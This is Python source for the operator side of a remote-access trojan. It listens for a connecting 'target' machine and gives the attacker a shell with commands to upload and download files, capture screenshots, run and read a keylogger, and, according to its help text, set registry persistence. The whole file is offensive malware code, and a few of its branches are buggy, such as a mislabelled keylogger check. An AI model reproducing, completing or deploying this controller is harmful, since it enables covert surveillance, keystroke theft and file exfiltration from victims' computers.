import socket
import termcolor
import json
import os
import keylogger

class server:
    def reliable_recv(self):
        data=''
        while True:
            try:
                data=data + self.target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def reliable_send(self,data):
        jsondata=json.dumps(data)
        self.target.send(jsondata.encode())

    def upload_file(self,file_name):
        f=open(file_name, 'rb')
        self.target.send(f.read())

    def download_file(self,file_name):
        f = open(file_name, 'wb')
        self.target.settimeout(1)
        chunk=self.target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = self.target.recv(1024)
            except socket.timeout as e:
                break
        self.target.settimeout(None)
        f.close()

    def show_file(self):
        f = open('processmanager.txt', 'r')
        content = f.readlines()
        print(content)
        f.close()
    #
    def target_communication(self):
        count=0
        while True:
            command=input('* Shell~%s: ' % str(self.ip))
            self.reliable_send(command)
            if command=='quit':
                break
            elif command =='clear':
                os.system('clear')
            elif command[:3] == 'cd ':
                pass
            elif command[:6] == 'upload':
                self.upload_file(command[7:])
            elif command[:8] == 'download':
                self.download_file(command[9:])
            elif command[:10] == 'screenshot':
                f = open('screenshot%d' %(count), 'wb')
                self.target.settimeout(3)
                chunk = self.target.recv(1024)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = self.target.recv(1024)
                    except socket.timeout as e:
                        break
                self.target.settimeout(None)
                f.close()
                count+=1
            elif command[:10] == 'keylogger_start':
                target = keylogger.keylog()
            elif command[:15] == 'keylogger_start':
                target = keylogger.keylog()
            elif command[:14] == 'keylogger_show':
                self.show_file()
            elif command[:14] == 'keylogger_stop':
                target.stop()

            #
            elif command == 'help':
                print(termcolor.colored('''\n
                quit                            --->Quit Session with the Target
                clear                           --->Clear the Screen
                cd *Directory name*             --->Change Directory on Target System
                upload *File Name*              --->Upload file to the Target Machine
                download *File Name*            --->Download file from the Target Machine
                keylogger_start                 --->Start the keyLogger
                keylogger_show                     --->Print the keystroke that the target Inputted.
                keylogger_stop                     --->Stop and Self destruct Keylogger File
                persistence *Regname* *Filename*    --->Create Persistent in the Registry'''), 'red')
            else:
                result=self.reliable_recv()
                print(result)

    def __init__(self):
        self.sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('127.0.0.1', 5555))
        #sock.bind(('192.168.0.7', 5555))
        print(termcolor.colored('[ + ] Listening for the incoming Connection','green'))
        self.sock.listen(5)
        self.target, self.ip = self.sock.accept()
        print(termcolor.colored('[ + ] Target connected From: '+ str(self.ip), 'green' ))
        self.target_communication()
